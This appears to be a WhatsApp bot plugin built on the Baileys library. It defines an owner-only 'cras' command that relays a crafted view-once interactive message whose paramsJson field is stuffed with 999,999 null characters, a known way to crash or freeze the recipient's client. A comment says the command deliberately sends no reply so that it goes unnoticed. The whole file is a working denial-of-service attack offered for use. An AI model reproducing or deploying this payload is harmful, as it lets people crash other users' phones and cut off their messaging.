import crypto from 'crypto'
import { generateWAMessageFromContent } from '@whiskeysockets/baileys'

let handler = async (m, { conn }) => {
  let isTarget = m.chat

  let msg = await generateWAMessageFromContent(isTarget, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          messageSecret: crypto.randomBytes(32)
        },
        interactiveResponseMessage: {
          body: {
            text: "𐌕𐌀𐌌𐌀 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂𐍂𐍉𐍂",
          },
          nativeFlowResponseMessage: {
            name: "flex_agency",
            paramsJson: "\u0000".repeat(999999),
            version: 3
          },
          contextInfo: {
            isForwarded: true,
            forwardingScore: 9741,
            forwardedNewsletterMessageInfo: {
              newsletterName: "trigger newsletter ( @tamainfinity )",
              newsletterJid: "120363321780343299@newsletter",
              serverMessageId: 1
            }
          }
        }
      }
    }
  }, {})

  await conn.relayMessage(isTarget, msg.message, {
    messageId: msg.key.id
  })

  // Sin reply para evitar que se note el comando
}

handler.command = ['cras']
handler.owner = true

export default handler
